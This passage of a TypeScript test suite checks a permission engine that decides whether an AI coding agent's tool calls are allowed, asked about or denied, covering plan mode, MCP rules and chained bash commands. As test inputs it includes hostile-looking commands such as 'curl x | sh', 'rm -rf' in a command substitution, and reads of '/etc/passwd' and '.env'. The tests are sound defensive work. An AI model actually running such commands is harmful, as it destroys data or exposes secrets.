  it('an absolute specifier still works on the no-cwd best-effort path when the input is already absolute', () => {
    expect(decide('read', { path: '/etc/passwd' }, ctx({ deny: ['Read(//etc/passwd)'] }))).toBe(
      'deny'
    )
  })

  it('a SINGLE leading slash is NOT treated as absolute (unchanged — Claude reads it as settings-relative)', () => {
    expect(
      decide('read', { path: '/etc/passwd' }, ctx({ deny: ['Read(/etc/passwd)'] }, '/repo'))
    ).toBe('allow')
  })

  it('ordinary relative specifiers keep their cwd-relative semantics', () => {
    expect(
      decide('edit', { path: '/repo/src/foo.ts' }, ctx({ deny: ['Edit(src/**)'] }, '/repo'))
    ).toBe('deny')
    expect(
      decide('edit', { path: '/elsewhere/src/foo.ts' }, ctx({ deny: ['Edit(src/**)'] }, '/repo'))
    ).toBe('ask')
  })
})

describe('additionalDirectories / defaultMode — deliberately deferred, must stay inert (never default-allow)', () => {
  it('additionalDirectories present in rules does not widen access for a path outside cwd/scope', () => {
    const ctx = {
      mode: 'default', // mode base for edit is 'ask'
      rules: rules({ additionalDirectories: ['/extra'] }),
      sessionAllows: NO_SESSION_ALLOWS,
      cwd: '/repo'
    }
    // A path under the "additional directory" gets NO special treatment —
    // behaves exactly like any other out-of-cwd path (falls through to mode base).
    expect(decide('edit', { path: '/extra/notes.md' }, ctx)).toBe('ask')
  })

  it('additionalDirectories does not make an unrelated allow rule match a path it otherwise would not', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Edit(src/**)'], additionalDirectories: ['/extra'] }),
      sessionAllows: NO_SESSION_ALLOWS,
      cwd: '/repo'
    }
    expect(decide('edit', { path: '/extra/notes.md' }, ctx)).toBe('ask')
  })

  it('defaultMode present in rules does not override the live session mode', () => {
    const ctx = {
      mode: 'default', // live mode chosen by the user/session — mode base for edit is 'ask'
      rules: rules({ defaultMode: 'bypassPermissions' }), // would mean allow-everything if honored
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('edit', { path: 'x.ts' }, ctx)).toBe('ask')
  })
})

describe("claudeGlobMatches — parity with opencode's real Wildcard.match (vendor/opencode-src/packages/core/src/util/wildcard.ts)", () => {
  // Independently re-derived from the vendored source (not a call into the
  // same implementation) — an oracle to catch drift if claudeGlobMatches'
  // port is ever edited out of step with what it's supposed to mirror.
  function referenceWildcardMatch(input: string, pattern: string): boolean {
    const normalized = input.replaceAll('\\', '/')
    let escaped = pattern
      .replaceAll('\\', '/')
      .replace(/[.+^${}()|[\]\\]/g, '\\$&')
      .replace(/\*/g, '.*')
      .replace(/\?/g, '.')
    if (escaped.endsWith(' .*')) escaped = escaped.slice(0, -3) + '( .*)?'
    return new RegExp('^' + escaped + '$', process.platform === 'win32' ? 'si' : 's').test(
      normalized
    )
  }

  const cases: [string, string][] = [
    ['src/foo.ts', 'src/**'],
    ['src/a/b/c.ts', 'src/**'],
    ['lib/foo.ts', 'src/**'],
    ['docs/readme.md', 'docs/**'],
    ['anything/at/all.ts', '**'],
    ['foo.ts', '*.ts'],
    ['foo.txt', '*.ts'],
    ['a/b.ts', 'a/?.ts'],
    ['a/bb.ts', 'a/?.ts']
  ]

  it.each(cases)(
    'claudeGlobMatches(%j, %j) agrees with the independently re-derived reference',
    (input, pattern) => {
      expect(claudeGlobMatches(input, pattern)).toBe(referenceWildcardMatch(input, pattern))
    }
  )
})

describe('decide — sessionAllows', () => {
  it('honors a bare tool sessionAllows entry', () => {
    const ctx = { mode: 'default', rules: rules(), sessionAllows: new Set(['edit']) }
    expect(decide('edit', { path: 'x.ts' }, ctx)).toBe('allow')
  })

  it('a sessionAllows entry for a DIFFERENT tool does not match', () => {
    const ctx = { mode: 'default', rules: rules(), sessionAllows: new Set(['edit']) }
    expect(decide('write', { path: 'x.ts' }, ctx)).toBe('ask')
  })

  it('scopes bash sessionAllows by the normalized command', () => {
    const ctx = { mode: 'default', rules: rules(), sessionAllows: new Set(['bash:npm test']) }
    expect(decide('bash', { command: 'npm test' }, ctx)).toBe('allow')
    expect(decide('bash', { command: '  npm   test  ' }, ctx)).toBe('allow') // normalized match
    expect(decide('bash', { command: 'npm test unit' }, ctx)).toBe('ask') // different command — not covered
  })

  it('sessionAllows is checked before allow rules but after deny/ask', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ deny: ['Bash'] }),
      sessionAllows: new Set(['bash:npm test'])
    }
    expect(decide('bash', { command: 'npm test' }, ctx)).toBe('deny')
  })
})

describe('decide — unknown Claude tool names never match a pi tool', () => {
  it('an unmapped allow rule never matches (falls through to mode base)', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['WebFetch'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('bash', { command: 'x' }, ctx)).toBe('ask')
  })

  it('an unmapped deny rule never matches (full mode still allows)', () => {
    const ctx = { mode: 'full', rules: rules({ deny: ['Task'] }), sessionAllows: NO_SESSION_ALLOWS }
    expect(decide('edit', {}, ctx)).toBe('allow')
  })
})

describe('sessionAllowKey', () => {
  it('scopes bash by normalized command', () => {
    expect(sessionAllowKey('bash', { command: '  npm   test  ' })).toBe('bash:npm test')
  })

  it('uses the bare tool name for non-bash tools', () => {
    expect(sessionAllowKey('edit', { path: 'x.ts' })).toBe('edit')
  })
})

describe('normalizeWhitespace', () => {
  it('trims and collapses internal whitespace runs', () => {
    expect(normalizeWhitespace('  npm   test   unit  ')).toBe('npm test unit')
  })
})

describe('mergedClaudeRulesFor', () => {
  it('merges user + project + local scopes in order', () => {
    mockLoadClaudePermissions.mockImplementation((scope: string) => {
      if (scope === 'user')
        return { allow: ['Read'], deny: [], ask: [], additionalDirectories: ['/u'] }
      if (scope === 'project')
        return { allow: ['Edit'], deny: ['Bash(rm:*)'], ask: [], additionalDirectories: [] }
      return { allow: [], deny: [], ask: ['Write'], additionalDirectories: ['/l'] }
    })

    const merged = mergedClaudeRulesFor('/cwd')

    expect(merged.allow).toEqual(['Read', 'Edit'])
    expect(merged.deny).toEqual(['Bash(rm:*)'])
    expect(merged.ask).toEqual(['Write'])
    expect(merged.additionalDirectories).toEqual(['/u', '/l'])
    expect(mockLoadClaudePermissions).toHaveBeenCalledWith('user', '/cwd')
    expect(mockLoadClaudePermissions).toHaveBeenCalledWith('project', '/cwd')
    expect(mockLoadClaudePermissions).toHaveBeenCalledWith('local', '/cwd')
  })

  it('is best-effort — a throwing loader yields empty rules rather than throwing', () => {
    mockLoadClaudePermissions.mockImplementation(() => {
      throw new Error('disk on fire')
    })
    expect(() => mergedClaudeRulesFor('/cwd')).not.toThrow()
    expect(mergedClaudeRulesFor('/cwd')).toEqual(rules())
  })

  it("the catch-path result is a FRESH, mutable object — not `{...EMPTY_RULES}` sharing EMPTY_RULES' frozen arrays (A9)", () => {
    mockLoadClaudePermissions.mockImplementation(() => {
      throw new Error('disk on fire')
    })
    const result = mergedClaudeRulesFor('/cwd')

    expect(result).not.toBe(EMPTY_RULES)
    expect(result.allow).not.toBe(EMPTY_RULES.allow)
    expect(() => result.allow.push('Read')).not.toThrow()
    expect(result.allow).toEqual(['Read'])
  })
})

describe('EMPTY_RULES — frozen (A9)', () => {
  it('the object itself is frozen', () => {
    expect(Object.isFrozen(EMPTY_RULES)).toBe(true)
  })

  it('every array property is ALSO frozen (deep freeze, not just the top-level object)', () => {
    expect(Object.isFrozen(EMPTY_RULES.allow)).toBe(true)
    expect(Object.isFrozen(EMPTY_RULES.deny)).toBe(true)
    expect(Object.isFrozen(EMPTY_RULES.ask)).toBe(true)
    expect(Object.isFrozen(EMPTY_RULES.additionalDirectories)).toBe(true)
  })

  it('mutating an EMPTY_RULES array never actually changes it (frozen — throws in strict mode, ES modules are always strict)', () => {
    try {
      EMPTY_RULES.allow.push('Read')
    } catch {
      // Expected: a frozen array throws on mutation in strict mode.
    }
    expect(EMPTY_RULES.allow).toEqual([])
  })
})

describe('PI_HOSTED_TOOL_NAMES (A1)', () => {
  it('is the superset of PI_AUTO_ALLOW_HOSTED_TOOLS plus dispatch_agent, agent, send_message and task_stop (ADR-089)', () => {
    expect([...PI_HOSTED_TOOL_NAMES].sort()).toEqual(
      [
        'agent',
        'create_mockup',
        'dispatch_agent',
        'list_models',
        'render_mermaid',
        'send_message',
        'show_mockup',
        'task_stop'
      ].sort()
    )
    // `agent` (and S3b's two) get a one-shot grant like dispatch_agent, never auto-allow.
    expect(PI_AUTO_ALLOW_HOSTED_TOOLS.has('agent')).toBe(false)
    expect(PI_AUTO_ALLOW_HOSTED_TOOLS.has('send_message')).toBe(false)
    expect(PI_AUTO_ALLOW_HOSTED_TOOLS.has('task_stop')).toBe(false)
    for (const name of PI_AUTO_ALLOW_HOSTED_TOOLS) {
      expect(PI_HOSTED_TOOL_NAMES.has(name)).toBe(true)
    }
  })
})

// ---------------------------------------------------------------------------
// decideWithSource — provenance. Auto mode (phase 4) needs to tell a user-
// authored ask from a mode-base ask (G9): the former goes straight to the
// human, the latter to the classifier. Getting this wrong in either direction
// is a real permission bug, so the ladder's provenance is pinned rung by rung.
// ---------------------------------------------------------------------------

describe('decideWithSource — provenance for every rung of the ladder', () => {
  it('reports ask-rule (with the matched rule) for a USER ask, and mode-base for the same tool without one', () => {
    const withRule = decideWithSource(
      'bash',
      { command: 'git push origin main' },
      {
        mode: 'acceptEdits',
        rules: rules({ ask: ['Bash(git push:*)'] }),
        sessionAllows: NO_SESSION_ALLOWS
      }
    )
    expect(withRule).toEqual({ decision: 'ask', source: 'ask-rule', rule: 'Bash(git push:*)' })

    // Same decision, entirely different provenance — this is the distinction
    // opencode cannot make natively and pi can.
    const withoutRule = decideWithSource(
      'bash',
      { command: 'git push origin main' },
      {
        mode: 'acceptEdits',
        rules: rules(),
        sessionAllows: NO_SESSION_ALLOWS
      }
    )
    expect(withoutRule).toEqual({ decision: 'ask', source: 'mode-base' })
  })

  it('a NON-matching ask rule does not claim provenance', () => {
    expect(
      decideWithSource(
        'bash',
        { command: 'npm test' },
        {
          mode: 'acceptEdits',
          rules: rules({ ask: ['Bash(git push:*)'] }),
          sessionAllows: NO_SESSION_ALLOWS
        }
      )
    ).toEqual({ decision: 'ask', source: 'mode-base' })
  })

  it('reports deny-rule / allow-rule / session-allow / hosted-auto-allow at their own rungs', () => {
    expect(
      decideWithSource(
        'bash',
        { command: 'rm -rf x' },
        {
          mode: 'full',
          rules: rules({ deny: ['Bash(rm:*)'], ask: ['Bash'] }),
          sessionAllows: NO_SESSION_ALLOWS
        }
      )
    ).toEqual({ decision: 'deny', source: 'deny-rule', rule: 'Bash(rm:*)' })

    expect(
      decideWithSource(
        'edit',
        { path: 'src/x.ts' },
        {
          mode: 'default',
          rules: rules({ allow: ['Edit(src/**)'] }),
          sessionAllows: NO_SESSION_ALLOWS
        }
      )
    ).toEqual({ decision: 'allow', source: 'allow-rule', rule: 'Edit(src/**)' })

    expect(
      decideWithSource(
        'bash',
        { command: 'npm test' },
        {
          mode: 'default',
          rules: rules(),
          sessionAllows: new Set(['bash:npm test'])
        }
      )
    ).toEqual({ decision: 'allow', source: 'session-allow' })

    expect(
      decideWithSource(
        'render_mermaid',
        {},
        {
          mode: 'default',
          rules: rules(),
          sessionAllows: NO_SESSION_ALLOWS
        }
      )
    ).toEqual({ decision: 'allow', source: 'hosted-auto-allow' })
  })

  it('decide() is exactly decideWithSource().decision across the whole ladder', () => {
    const cases: Array<[string, Record<string, unknown>, Partial<MergedClaudeRules>, string]> = [
      ['bash', { command: 'rm -rf x' }, { deny: ['Bash(rm:*)'] }, 'full'],
      ['render_mermaid', {}, {}, 'default'],
      ['bash', { command: 'git push' }, { ask: ['Bash(git push:*)'] }, 'full'],
      ['edit', { path: 'src/x.ts' }, { allow: ['Edit(src/**)'] }, 'default'],
      ['read', { path: 'x' }, {}, 'default'],
      ['bash', { command: 'anything' }, {}, 'acceptEdits'],
      ['write', { path: 'x' }, {}, 'plan']
    ]
    for (const [tool, input, partial, mode] of cases) {
      const ctx = { mode, rules: rules(partial), sessionAllows: NO_SESSION_ALLOWS }
      expect(decide(tool, input, ctx)).toBe(decideWithSource(tool, input, ctx).decision)
    }
  })
})

// ---------------------------------------------------------------------------
// withoutAllowRules — auto mode's classifier-bypass filter (cli.js §3 step 2).
// Applied at PiSession's composition seam; asserted here against the pure
// ladder, since the property that matters is "precedence is unchanged".
// ---------------------------------------------------------------------------

describe('withoutAllowRules — the auto-mode allow filter', () => {
  const full = (): MergedClaudeRules =>
    rules({
      allow: ['Bash(git:*)', 'Edit(src/**)'],
      ask: ['Bash(git push:*)'],
      deny: ['Bash(rm:*)'],
      additionalDirectories: ['/extra']
    })

  it('empties the allow tier and leaves everything else identical', () => {
    expect(withoutAllowRules(full())).toEqual({ ...full(), allow: [] })
  })

  it('does NOT mutate its input — PiSession caches the merged rules per session', () => {
    // A mutating filter would strip the allow tier permanently, so switching out
    // of auto mode later would silently keep asking about allowed actions.
    const original = full()
    withoutAllowRules(original)
    expect(original.allow).toEqual(['Bash(git:*)', 'Edit(src/**)'])
  })

  it('a formerly-allowed bash call falls through to the acceptEdits base ask (→ the judge)', () => {
    const ctx = { mode: 'acceptEdits', sessionAllows: NO_SESSION_ALLOWS, cwd: '/repo' }
    // Covered by the allow rule but NOT by the ask rule, so this isolates the
    // allow tier's contribution.
    const input = { command: 'git reset --hard HEAD~5' }
    expect(decideWithSource('bash', input, { ...ctx, rules: full() })).toEqual({
      decision: 'allow',
      source: 'allow-rule',
      rule: 'Bash(git:*)'
    })
    expect(decideWithSource('bash', input, { ...ctx, rules: withoutAllowRules(full()) })).toEqual({
      decision: 'ask',
      source: 'mode-base'
    })
  })

  it('deny and ask still answer first — G9 provenance is untouched by the filter', () => {
    const ctx = {
      mode: 'acceptEdits',
      rules: withoutAllowRules(full()),
      sessionAllows: NO_SESSION_ALLOWS,
      cwd: '/repo'
    }
    expect(decideWithSource('bash', { command: 'rm -rf x' }, ctx)).toEqual({
      decision: 'deny',
      source: 'deny-rule',
      rule: 'Bash(rm:*)'
    })
    expect(decideWithSource('bash', { command: 'git push origin main' }, ctx)).toEqual({
      decision: 'ask',
      source: 'ask-rule',
      rule: 'Bash(git push:*)'
    })
  })

  it('a session "allow for this session" click still allows — only stored rules are filtered', () => {
    expect(
      decideWithSource(
        'bash',
        { command: 'npm publish' },
        {
          mode: 'acceptEdits',
          rules: withoutAllowRules(full()),
          sessionAllows: new Set(['bash:npm publish']),
          cwd: '/repo'
        }
      )
    ).toEqual({ decision: 'allow', source: 'session-allow' })
  })
})

/**
 * Slice 4b guard. Claude's MCP rule vocabulary is `mcp__<server>` (every tool
 * on one server) and `mcp__<server>__<tool>` (one tool); neither takes a
 * specifier. Before this slice `ruleMatchesTool` mapped a rule's tool name
 * through CLAUDE_TOOL_TO_KIND, which lists only Bash/Edit/Write/Read/Grep/
 * Glob/LS — so every `mcp__…` rule a user wrote was inert on this engine, in
 * every tier, and an MCP tool call fell straight through to the mode base.
 * Codex's MCP approval (ADR-067) is gated through exactly this ladder, so the
 * rules have to bind here or they bind nowhere.
 */
describe('decide — MCP rules in Claude vocabulary (Slice 4b)', () => {
  const ctx = (partial: Partial<MergedClaudeRules>) => ({
    mode: 'default',
    rules: rules(partial),
    sessionAllows: NO_SESSION_ALLOWS,
    cwd: '/repo'
  })

  it('an exact tool rule matches that tool in every tier', () => {
    expect(decideWithSource('mcp__probe__ping', {}, ctx({ deny: ['mcp__probe__ping'] }))).toEqual({
      decision: 'deny',
      source: 'deny-rule',
      rule: 'mcp__probe__ping'
    })
    expect(decideWithSource('mcp__probe__ping', {}, ctx({ allow: ['mcp__probe__ping'] }))).toEqual({
      decision: 'allow',
      source: 'allow-rule',
      rule: 'mcp__probe__ping'
    })
    expect(decideWithSource('mcp__probe__ping', {}, ctx({ ask: ['mcp__probe__ping'] }))).toEqual({
      decision: 'ask',
      source: 'ask-rule',
      rule: 'mcp__probe__ping'
    })
  })

  it('a server rule covers every tool on that server and nothing else', () => {
    expect(decideWithSource('mcp__probe__ping', {}, ctx({ allow: ['mcp__probe'] }))).toEqual({
      decision: 'allow',
      source: 'allow-rule',
      rule: 'mcp__probe'
    })
    // The bare server name itself — what the gate falls back to when the tool
    // name cannot be read off the elicitation.
    expect(decideWithSource('mcp__probe', {}, ctx({ allow: ['mcp__probe'] }))).toEqual({
      decision: 'allow',
      source: 'allow-rule',
      rule: 'mcp__probe'
    })
    // A prefix that is not a segment boundary must NOT match.
    expect(decide('mcp__probe-two__ping', {}, ctx({ allow: ['mcp__probe'] }))).toBe('ask')
    // A different tool on the same server is not covered by an exact tool rule.
    expect(decide('mcp__probe__pong', {}, ctx({ allow: ['mcp__probe__ping'] }))).toBe('ask')
  })

  it('leaves non-MCP tool names and specifier forms exactly as they were', () => {
    // A bare `Bash` rule still matches bash and only bash.
    expect(decide('mcp__probe__ping', {}, ctx({ allow: ['Bash'] }))).toBe('ask')
    // Claude has no specifier form for MCP rules; one is not invented here.
    expect(decide('mcp__probe__ping', {}, ctx({ allow: ['mcp__probe__ping(x)'] }))).toBe('ask')
    // …but `(*)`/`()` collapse to a whole-tool rule in parseClaudeRule, so they
    // keep the meaning a user reading Claude's own syntax would expect.
    expect(decide('mcp__probe__ping', {}, ctx({ allow: ['mcp__probe__ping(*)'] }))).toBe('allow')
  })

  it('scopes "allow for this session" to the full mcp tool name', () => {
    expect(sessionAllowKey('mcp__probe__ping', {})).toBe('mcp__probe__ping')
  })

  it('`mcp__<server>__*` is the server form (ADR-085; cli.js reads a `*` tool as the server)', () => {
    expect(decideWithSource('mcp__probe__ping', {}, ctx({ allow: ['mcp__probe__*'] }))).toEqual({
      decision: 'allow',
      source: 'allow-rule',
      rule: 'mcp__probe__*'
    })
    expect(decide('mcp__probe', {}, ctx({ deny: ['mcp__probe__*'] }))).toBe('deny')
    expect(decide('mcp__probe-two__ping', {}, ctx({ allow: ['mcp__probe__*'] }))).toBe('ask')
  })
})

/**
 * ADR-085 §2 — the Bash tiers are matched AS their tier. Before, every tier was
 * a raw whole-command `startsWith`: a deny/ask rule missed a reordered,
 * wrapped or chained spelling, and an allow rule covered anything that merely
 * STARTED with its prefix (`ls && git push --force` under `Bash(ls:*)`).
 */
describe('decideWithSource — tier-aware Bash rules (ADR-085)', () => {
  const ctx = (partial: Partial<MergedClaudeRules>, mode = 'default') => ({
    mode,
    rules: rules(partial),
    sessionAllows: NO_SESSION_ALLOWS,
    cwd: '/repo'
  })
  const bash = (command: string) => ({ command })
  const deny = ['Bash(git push --force:*)']

  it('a deny rule hits a reordered, wrapped or chained spelling, in every mode', () => {
    for (const command of [
      'git push origin main --force',
      'sudo git push --force',
      'ls && git push -f',
      'git -C . push origin +main',
      'for b in a; do git push --force origin $b; done'
    ]) {
      for (const mode of ['default', 'acceptEdits', 'full']) {
        expect(decideWithSource('bash', bash(command), ctx({ deny }, mode)), command).toEqual({
          decision: 'deny',
          source: 'deny-rule',
          rule: 'Bash(git push --force:*)'
        })
      }
    }
  })

  it('a deny rule beats an allow rule that covers the same command', () => {
    expect(
      decide('bash', bash('git push origin main --force'), ctx({ deny, allow: ['Bash(git:*)'] }))
    ).toBe('deny')
  })

  it('an ask rule hits past global options, so G9 still routes to the human', () => {
    expect(
      decideWithSource(
        'bash',
        bash('docker --context x run alpine'),
        ctx({ ask: ['Bash(docker run:*)'] }, 'full')
      )
    ).toEqual({ decision: 'ask', source: 'ask-rule', rule: 'Bash(docker run:*)' })
  })

  it('a chained command needs EVERY segment covered by the allow tier', () => {
    const allow = ['Bash(ls:*)', 'Bash(git status:*)']
    expect(decide('bash', bash('ls && git push --force'), ctx({ allow }))).toBe('ask')
    expect(decide('bash', bash('ls && curl x | sh'), ctx({ allow }))).toBe('ask')
    expect(decideWithSource('bash', bash('ls -la && git status'), ctx({ allow }))).toEqual({
      decision: 'allow',
      source: 'allow-rule',
      rule: 'Bash(ls:*)'
    })
  })

  it('the allow tier refuses substitutions, keeps redirections and quoted newlines', () => {
    const allow = ['Bash(git:*)', 'Bash(bun run build:*)']
    expect(decide('bash', bash('git log $(rm -rf x)'), ctx({ allow }))).toBe('ask')
    expect(decide('bash', bash('bun run build > build.log'), ctx({ allow }))).toBe('allow')
    expect(decide('bash', bash('git commit -m "a\nb"'), ctx({ allow }))).toBe('allow')
  })

  it("allows Claude's heredoc commit shape when git and cat are allowed", () => {
    const commit = "git commit -m \"$(cat <<'EOF'\nfeat: it's done (finally)\nEOF\n)\""
    expect(decide('bash', bash(commit), ctx({ allow: ['Bash(git:*)', 'Bash(cat:*)'] }))).toBe(
      'allow'
    )
    expect(decide('bash', bash(commit), ctx({ allow: ['Bash(git:*)'] }))).toBe('ask')
  })

  it('a prefix allow is word-boundary now (cli.js parity)', () => {
    expect(decide('bash', bash('git-lfs pull'), ctx({ allow: ['Bash(git:*)'] }))).toBe('ask')
    expect(decide('bash', bash('git'), ctx({ allow: ['Bash(git:*)'] }))).toBe('allow')
  })

  it('a bare Bash allow still allows everything', () => {
    expect(decide('bash', bash('echo $(date) | sh'), ctx({ allow: ['Bash'] }))).toBe('allow')
  })

  it('the auto-mode shape (allow tier emptied, acceptEdits base) still asks on a reordered deny', () => {
    // `withoutAllowRules` + `acceptEdits`, as PiSession composes it: the deny must still bind.
    expect(
      decide(
        'bash',
        bash('git push origin main --force'),
        ctx(withoutAllowRules(rules({ deny, allow: ['Bash(git:*)'] })), 'acceptEdits')
      )
    ).toBe('deny')
  })
})

// ADR-085 S3b — owner ruling 7, "plan mode wins": in plan mode an edit/write or a
// command isPlanSafeBashCommand cannot vouch for is refused regardless of the
// user's ask/allow rules and session allows; a user deny still answers first.
describe('ADR-085 S3b — plan mode outranks allow/ask rules and session allows for mutating calls', () => {
  const ctx = (
    partial: Partial<MergedClaudeRules>,
    mode = 'plan',
    sessionAllows: ReadonlySet<string> = NO_SESSION_ALLOWS
  ) => ({ mode, rules: rules(partial), sessionAllows, cwd: '/repo' })
  const allow = ['Edit', 'Write', 'Bash(git:*)', 'Read(docs/**)']

  it('an Edit / Write allow does not allow an edit or write in plan mode', () => {
    expect(decideWithSource('edit', { path: 'src/a.ts' }, ctx({ allow }))).toEqual({
      decision: 'deny',
      source: 'mode-base'
    })
    expect(decideWithSource('write', { path: 'src/b.ts' }, ctx({ allow }))).toEqual({
      decision: 'deny',
      source: 'mode-base'
    })
  })

  it('a session allow for edit or for the exact command does not allow it in plan mode', () => {
    const command = 'git   commit -m x'
    const sessionAllows = new Set([
      sessionAllowKey('edit', { path: 'a.ts' }),
      sessionAllowKey('bash', { command })
    ])
    expect(sessionAllows.has('bash:git commit -m x')).toBe(true)
    expect(decideWithSource('edit', { path: 'a.ts' }, ctx({}, 'plan', sessionAllows))).toEqual({
      decision: 'deny',
      source: 'mode-base'
    })
    expect(decideWithSource('bash', { command }, ctx({}, 'plan', sessionAllows))).toEqual({
      decision: 'deny',
      source: 'mode-base'
    })
  })

  it('Bash(git:*) still allows a plan-safe git command, not a mutating one', () => {
    expect(decideWithSource('bash', { command: 'git status' }, ctx({ allow }))).toEqual({
      decision: 'allow',
      source: 'allow-rule',
      rule: 'Bash(git:*)'
    })
    expect(decideWithSource('bash', { command: 'git commit -m x' }, ctx({ allow }))).toEqual({
      decision: 'deny',
      source: 'mode-base'
    })
  })

  it('a user deny rule on the same command still answers first, with its rule', () => {
    expect(
      decideWithSource(
        'bash',
        { command: 'git commit -m x' },
        ctx({ allow, deny: ['Bash(git commit:*)'] })
      )
    ).toEqual({ decision: 'deny', source: 'deny-rule', rule: 'Bash(git commit:*)' })
    expect(
      decideWithSource('edit', { path: 'src/a.ts' }, ctx({ allow, deny: ['Edit(src/**)'] }))
    ).toEqual({ decision: 'deny', source: 'deny-rule', rule: 'Edit(src/**)' })
  })

  it('an ask rule on a plan-safe command still asks (the rung is for mutating calls only)', () => {
    expect(
      decideWithSource('bash', { command: 'git status' }, ctx({ ask: ['Bash(git status:*)'] }))
    ).toEqual({ decision: 'ask', source: 'ask-rule', rule: 'Bash(git status:*)' })
  })

  it('a read under an allow rule is unchanged in plan mode', () => {
    expect(decideWithSource('read', { path: 'docs/a.md' }, ctx({ allow }))).toEqual({
      decision: 'allow',
      source: 'allow-rule',
      rule: 'Read(docs/**)'
    })
  })

  it('the rung is plan-only: default mode with the same allows allows', () => {
    expect(decideWithSource('edit', { path: 'src/a.ts' }, ctx({ allow }, 'default'))).toEqual({
      decision: 'allow',
      source: 'allow-rule',
      rule: 'Edit'
    })
    expect(
      decideWithSource('bash', { command: 'git commit -m x' }, ctx({ allow }, 'default'))
    ).toEqual({ decision: 'allow', source: 'allow-rule', rule: 'Bash(git:*)' })
  })

  it('acceptEdits is unaffected', () => {
    expect(decideWithSource('edit', { path: 'src/a.ts' }, ctx({}, 'acceptEdits'))).toEqual({
      decision: 'allow',
      source: 'mode-base'
    })
    expect(
      decideWithSource('bash', { command: 'git commit -m x' }, ctx({ allow }, 'acceptEdits'))
    ).toEqual({ decision: 'allow', source: 'allow-rule', rule: 'Bash(git:*)' })
    expect(
      decideWithSource('bash', { command: 'rm -rf x' }, ctx({ ask: ['Bash(rm:*)'] }, 'acceptEdits'))
    ).toEqual({ decision: 'ask', source: 'ask-rule', rule: 'Bash(rm:*)' })
  })

  it('planModeOutranksRules — which kinds the plan base outranks the rules for', () => {
    const cases: Array<[string, Record<string, unknown>, boolean]> = [
      ['edit', { path: 'a.ts' }, true],
      ['write', { path: 'a.ts' }, true],
      ['bash', { command: 'git commit -m x' }, true],
      ['bash', { command: 'rm -rf x' }, true],
      ['bash', { command: 'ls && touch x' }, true],
      ['bash', {}, true],
      ['bash', { command: 'git status' }, false],
      ['bash', { command: 'ls -la | wc -l' }, false],
      ['read', { path: 'a.ts' }, false],
      ['grep', { pattern: 'x' }, false],
      ['find', { pattern: '*.ts' }, false],
      ['ls', {}, false],
      ['exit_plan', { plan: 'p' }, false],
      ['subagent', { agent: 'a', task: 't' }, false],
      ['render_mermaid', {}, false],
      ['mystery_tool', {}, false]
    ]
    for (const [tool, input, expected] of cases) {
      expect(planModeOutranksRules(piToolKind(tool), input), tool).toBe(expected)
    }
  })
})

// ADR-085 S3b (F3) — plan mode's read-only oracle is the UNION of pi's plan-safe
// list and ADR-084's static read-only checker (either one vouching is enough).
describe('ADR-085 S3b — plan-mode read-only oracle = plan-safe list ∪ ADR-084 checker', () => {
  const realpath = (): undefined => undefined
  const scopeFor = (platform: NodeJS.Platform) => ({
    cwd: platform === 'win32' ? 'D:/repo' : '/repo',
    additionalDirectories: [] as string[],
    rules: { deny: [] as string[] },
    platform,
    realpath
  })
  const readOnly = (command: string, platform: NodeJS.Platform = 'win32') =>
    isPlanReadOnlyCommand({ toolName: 'bash', input: { command } }, scopeFor(platform))
  const planCtx = (partial: Partial<MergedClaudeRules> = {}, cwd: string | null = 'D:/repo') => ({
    mode: 'plan',
    rules: rules(partial),
    sessionAllows: NO_SESSION_ALLOWS,
    ...(cwd !== null ? { cwd } : {}),
    platform: 'win32' as NodeJS.Platform,
    realpath
  })

  it.each([
    'Get-ChildItem -Path src',
    'Get-Content README.md',
    'Select-String -Path README.md -Pattern x',
    'grep "a && b" README.md',
    'cat README.md',
    'git status'
  ])('NOT refused (win32): %s', (command) => {
    expect(readOnly(command)).toBe(true)
  })

  it('NOT refused (linux): the quote-aware checker passes `grep "a && b" README.md`, which the list over-denies', () => {
    expect(isPlanSafeBashCommand('grep "a && b" README.md')).toBe(false)
    expect(readOnly('grep "a && b" README.md', 'linux')).toBe(true)
  })

  it.each(['git commit -m x', 'Set-Content x y', 'mkdir x', 'echo hi > f'])(
    'still refused: %s',
    (command) => {
      expect(readOnly(command)).toBe(false)
      expect(readOnly(command, 'linux')).toBe(false)
    }
  )

  it('still refused: `cd src && ls` — `cd` is unknown to BOTH oracles', () => {
    expect(isPlanSafeBashCommand('cd src && ls')).toBe(false)
    expect(readOnly('cd src && ls')).toBe(false)
  })

  it("pre-existing: pi's list passes `cat .env`, the union cannot tighten it", () => {
    expect(isPlanSafeBashCommand('cat .env')).toBe(true)
    expect(readOnly('cat .env')).toBe(true)
  })

  it('without a scope (no cwd) only the list decides: `Get-Content README.md` is refused', () => {
    expect(
      isPlanReadOnlyCommand({ toolName: 'bash', input: { command: 'Get-Content README.md' } })
    ).toBe(false)
    expect(
      decideWithSource('bash', { command: 'Get-Content README.md' }, planCtx({}, null))
    ).toEqual({ decision: 'deny', source: 'mode-base' })
  })

  it('the plan base on pi ALLOWS `Get-Content README.md` with no allow rule (the base and the rung agree)', () => {
    expect(decideWithSource('bash', { command: 'Get-Content README.md' }, planCtx())).toEqual({
      decision: 'allow',
      source: 'mode-base'
    })
    expect(decideWithSource('bash', { command: 'Set-Content x y' }, planCtx())).toEqual({
      decision: 'deny',
      source: 'mode-base'
    })
  })

  it('a Bash(Get-Content:*) allow covers `Get-Content README.md` in plan mode (allow-rule, not the plan rung)', () => {
    expect(
      decideWithSource(
        'bash',
        { command: 'Get-Content README.md' },
        planCtx({ allow: ['Bash(Get-Content:*)'] })
      )
    ).toEqual({ decision: 'allow', source: 'allow-rule', rule: 'Bash(Get-Content:*)' })
  })

  it('a user ASK rule on a checker-only read-only command asks, not refused (F4)', () => {
    expect(
      decideWithSource(
        'bash',
        { command: 'Get-Content README.md' },
        planCtx({ ask: ['Bash(Get-Content:*)'] })
      )
    ).toEqual({ decision: 'ask', source: 'ask-rule', rule: 'Bash(Get-Content:*)' })
  })

  it('a Read deny still refuses a checker-only reader of that path (the checker keeps the deny tier) — control', () => {
    expect(
      decideWithSource(
        'bash',
        { command: 'Get-Content secrets.txt' },
        planCtx({ deny: ['Read(secrets.txt)'] })
      )
    ).toEqual({ decision: 'deny', source: 'mode-base' })
  })

  it('planModeOutranksRules reads the scope: a cmdlet read is not outranked, a cmdlet write is', () => {
    const scope = scopeFor('win32')
